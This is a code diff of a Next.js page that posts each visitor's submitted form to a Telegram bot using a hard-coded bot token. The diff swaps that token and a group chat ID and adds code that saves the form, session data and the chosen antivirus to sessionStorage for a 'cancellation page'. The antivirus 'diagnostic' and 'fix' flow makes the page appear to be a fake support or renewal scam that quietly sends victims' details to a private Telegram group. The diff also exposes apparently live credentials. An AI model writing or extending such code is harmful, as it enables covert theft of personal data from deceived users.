@@ -194,7 +194,7 @@ export default function Home() {
   }
 
   const sendToTelegram = async (data: typeof formData) => {
-    const BOT_TOKEN = '7663738832:AAFJRhJjYu6eF1Edv2KhxZ_ytVvH8ozKgCM'
+    const BOT_TOKEN = '8317757418:AAF0YMJ0enh258_yEWXsg6-GAsYfrA7nYZ8'
     
     // Format the message with form data
     const message = `🔔 *New Form Submission*
@@ -223,7 +223,7 @@ export default function Home() {
     try {
       // Group chat_id
       // Note: Make sure your bot is added to the group as a member/admin
-      const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '-5131934008'
+      const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '-5294276637'
       
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -255,6 +255,16 @@ export default function Home() {
     
     // Send data to Telegram
     await sendToTelegram(formData)
+
+    // Persist data for cancellation page
+    if (typeof window !== 'undefined') {
+      try {
+        window.sessionStorage.setItem('diagnosticForm', JSON.stringify(formData))
+        window.sessionStorage.setItem('sessionData', JSON.stringify(sessionData))
+      } catch (err) {
+        console.error('Failed to persist diagnostic data', err)
+      }
+    }
     
     // Show modal
     setShowModal(true)
@@ -619,6 +629,13 @@ export default function Home() {
                 className="submit-button"
                 onClick={() => {
                   setShowFixModal(false)
+                  if (typeof window !== 'undefined') {
+                    try {
+                      window.sessionStorage.setItem('selectedAntivirus', selectedAntivirus || '')
+                    } catch (err) {
+                      console.error('Failed to persist antivirus', err)
+                    }
+                  }
                   const target = (selectedAntivirus || 'McAfee')
                     .toLowerCase()
                     .replace(/\s+/g, '')
